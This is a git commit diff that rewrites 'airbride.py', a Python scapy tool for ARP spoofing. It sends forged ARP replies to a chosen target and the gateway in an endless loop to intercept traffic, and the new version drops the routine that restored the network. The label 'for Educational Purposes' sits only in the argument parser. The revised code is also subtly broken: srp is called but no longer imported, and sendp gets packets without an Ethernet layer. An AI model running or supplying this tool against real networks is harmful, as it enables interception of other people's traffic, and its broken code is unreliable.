83c964afa6dc450f0a1cc6eb9eca1161bcc9bf1b
Fhchcjcjcjcjvkkvk <info@infopeklo.cz>
2024-12-13 13:59:05 +0100

    Update airbride.py

--- airbride.py
+++ airbride.py
@@ -1,72 +1,51 @@
 import argparse
+from scapy.all import ARP, Ether, sendp, get_if_hwaddr
 import time
-from scapy.all import ARP, Ether, send, srp
 
-# Function to perform ARP spoofing
-def arp_spoof(target_ip, gateway_ip, interface):
-    # Get MAC addresses for the target and gateway
+def get_mac(ip):
+    # Send an ARP request to get the MAC address for the given IP address
+    arp_request = ARP(op=1, pdst=ip)
+    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
+    request_packet = broadcast/arp_request
+    response = srp(request_packet, timeout=1, verbose=False)[0]
+    
+    # Return the MAC address of the first response (it should be the target)
+    return response[0][1].hwsrc
+
+def spoof(target_ip, gateway_ip, interface):
+    # Get the target's MAC address
     target_mac = get_mac(target_ip)
     gateway_mac = get_mac(gateway_ip)
 
-    if not target_mac or not gateway_mac:
-        print("[!] Could not retrieve MAC addresses. Exiting.")
-        return
+    print(f"Starting ARP spoofing. Target: {target_ip}, Gateway: {gateway_ip}.")
 
-    print(f"[*] Target MAC: {target_mac}")
-    print(f"[*] Gateway MAC: {gateway_mac}")
+    # Construct the ARP reply packet to send to the target
+    packet_to_target = ARP(op=2, pdst=target_ip, psrc=gateway_ip, hwdst=target_mac)
 
-    # Infinite loop to send ARP responses
-    while True:
-        # Send fake ARP reply to the target (target thinks our MAC is the gateway)
-        send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, verbose=False)
+    # Construct the ARP reply packet to send to the gateway
+    packet_to_gateway = ARP(op=2, pdst=gateway_ip, psrc=target_ip, hwdst=gateway_mac)
 
-        # Send fake ARP reply to the gateway (gateway thinks our MAC is the target)
-        send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, verbose=False)
+    try:
+        while True:
+            # Send the packets indefinitely
+            sendp(packet_to_target, iface=interface, verbose=False)
+            sendp(packet_to_gateway, iface=interface, verbose=False)
+            print(f"Sent spoofed ARP packets: Target {target_ip} and Gateway {gateway_ip}.")
+            time.sleep(2)
+    except KeyboardInterrupt:
+        print("\nARP Spoofing stopped by user.")
 
-        print(f"[*] Sent ARP spoof to target {target_ip} and gateway {gateway_ip}")
-        time.sleep(2)
-
-# Function to get MAC address from an IP address
-def get_mac(ip):
-    # Send ARP request to get the MAC address for the IP
-    arp_request = ARP(pdst=ip)
-    broadcast = Ether(dst="ff:ff:ff:ff:ff:ff")
-    arp_request_broadcast = broadcast/arp_request
-    answered_list = srp(arp_request_broadcast, timeout=1, verbose=False)[0]
-
-    # Return the MAC address
-    if answered_list:
-        return answered_list[0][1].hwsrc
-    else:
-        print(f"[!] Failed to get MAC address for {ip}")
-        return None
-
-# Function to restore the network to its original state
-def restore_network(target_ip, gateway_ip, target_mac, gateway_mac, interface):
-    print("[*] Restoring network...")
-    send(ARP(op=2, psrc=gateway_ip, pdst=target_ip, hwdst=target_mac), iface=interface, count=5, verbose=False)
-    send(ARP(op=2, psrc=target_ip, pdst=gateway_ip, hwdst=gateway_mac), iface=interface, count=5, verbose=False)
-    print("[*] Network restored.")
-
-# Main function to parse arguments and run ARP spoofing
 def main():
-    parser = argparse.ArgumentParser(description="ARP Spoofing Tool for Educational Purposes")
-    parser.add_argument("-t", "--target", required=True, help="Target IP Address")
-    parser.add_argument("-g", "--gateway", required=True, help="Gateway IP Address")
-    parser.add_argument("interface", help="Network Interface (e.g., eth0, wlan0)")
+    parser = argparse.ArgumentParser(description="ARP Spoofing for Educational Purposes")
+    parser.add_argument("interface", help="Network interface to use (e.g., 'eth0', 'Wi-Fi')")
+    parser.add_argument("target_ip", help="Target IP address to spoof")
+    parser.add_argument("gateway_ip", help="Gateway IP address to spoof")
     args = parser.parse_args()
 
-    target_ip = args.target
-    gateway_ip = args.gateway
-    interface = args.interface
+    print(f"Using interface: {args.interface}, Target IP: {args.target_ip}, Gateway IP: {args.gateway_ip}")
 
-    print(f"[*] Starting ARP Spoofing on interface {interface}")
-    try:
-        arp_spoof(target_ip, gateway_ip, interface)
-    except KeyboardInterrupt:
-        print("\n[!] Stopping ARP spoofing...")
-        restore_network(target_ip, gateway_ip, get_mac(target_ip), get_mac(gateway_ip), interface)
-        print("[*] Exiting the program...")
+    # Start ARP spoofing
+    spoof(args.target_ip, args.gateway_ip, args.interface)
 
 if __name__ == "__main__":
     main()
